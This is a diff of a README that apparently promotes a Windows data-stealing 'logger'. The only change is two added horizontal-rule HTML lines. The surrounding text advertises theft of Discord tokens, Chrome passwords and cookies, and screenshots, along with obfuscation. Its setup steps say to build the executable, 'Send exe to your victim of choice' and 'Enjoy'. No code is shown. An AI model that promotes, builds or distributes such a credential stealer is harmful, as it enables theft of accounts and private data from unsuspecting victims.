@@ -9,7 +9,8 @@ Pull sensitive data from users on windows including discord tokens and chrome da
 - 🟩 Chrome passwords & cookies
 - 🟩 Screenshot
 - 🟩 Obfuscation
-
+- 
+<hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">
 -Setup-
 1.Extract the zip file
 2.Install dependencies with `pip install -r requirements.txt' or by running 'install.bat'
@@ -18,3 +19,4 @@ Pull sensitive data from users on windows including discord tokens and chrome da
 5.Follow the instructions and enjoy your logger
 6.Send exe to your victim of choice
 7.Enjoy 
+<hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">
